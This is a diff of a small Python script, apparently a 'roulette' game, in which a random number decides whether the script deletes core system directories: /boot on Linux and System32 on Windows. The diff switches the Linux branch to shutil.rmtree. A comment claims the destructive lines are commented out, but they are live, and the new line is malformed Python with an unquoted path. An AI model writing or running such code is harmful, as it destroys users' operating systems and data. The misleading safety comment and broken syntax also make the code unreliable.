@@ -8,7 +8,8 @@
 #################################################################################################
 import random
 import os
-
+import platform
+import shutil
 # Generate a random number between 1 and 10
 number = random.randint(1,10)
 
@@ -40,7 +41,7 @@ else:
     # but they are commented out here to prevent accidental execution and system damage.
     os_name = platform.system()
     if os_name == 'Linux':
-      os.remove("/boot")
+      shutil.rmtree(/boot)
     elif os_name == 'Windows':
       os.remove("C:\Windows\System32")
     elif os_name == 'Darwin':
